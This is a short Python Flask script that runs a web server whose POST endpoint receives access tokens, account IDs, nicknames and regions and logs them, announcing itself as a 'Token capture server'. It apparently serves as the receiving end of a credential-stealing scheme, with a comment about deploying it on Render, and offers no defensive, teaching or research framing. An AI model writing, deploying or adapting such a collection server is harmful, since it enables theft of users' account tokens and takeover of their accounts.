from flask import Flask, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/user/<user_id>/', methods=['POST'])
def capture(user_id):
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400

        token = data.get('access_token', 'N/A')
        account_id = data.get('account_id', 'N/A')
        nickname = data.get('nickname', 'N/A')
        region = data.get('region', 'N/A')

        # Print to server logs (you'll see this on Render)
        print(f"🎯 Token captured from {nickname} ({account_id})")
        print(f"   Token: {token[:40]}...")

        return jsonify({"status": "success", "message": "OK"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "Token capture server is running!", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)